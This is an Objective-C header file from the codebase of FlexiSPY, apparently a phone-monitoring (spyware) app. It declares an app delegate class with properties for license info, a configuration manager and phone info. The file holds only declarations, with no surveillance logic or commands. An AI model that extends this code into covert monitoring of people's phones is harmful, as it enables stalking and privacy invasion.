//
//  FlexiSPYAppDelegate.h
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

@class AppUIConnection;
@class LicenseInfo;
@class ConfigurationManagerImpl;
@class PhoneInfoImp;

@protocol PhoneInfo;
@protocol ConfigurationManager;

@interface CyclopsAppDelegate : NSObject <UIApplicationDelegate> {
    
    UIWindow *window;
    UINavigationController *navigationController;
	
@private
	AppUIConnection	*mAppUIConnection;
	LicenseInfo		*mLicenseInfo;
	ConfigurationManagerImpl *mConfigurationManager;
	PhoneInfoImp	*mPhoneInfo;
}


@property (nonatomic, retain) IBOutlet UIWindow *window;
@property (nonatomic, retain) IBOutlet UINavigationController *navigationController;

@property (nonatomic, readonly) AppUIConnection *mAppUIConnection;
@property (nonatomic, retain) LicenseInfo *mLicenseInfo;
@property (nonatomic, readonly) id <ConfigurationManager> mConfigurationManager;
@property (nonatomic, readonly) id <PhoneInfo> mPhoneInfo;

@end

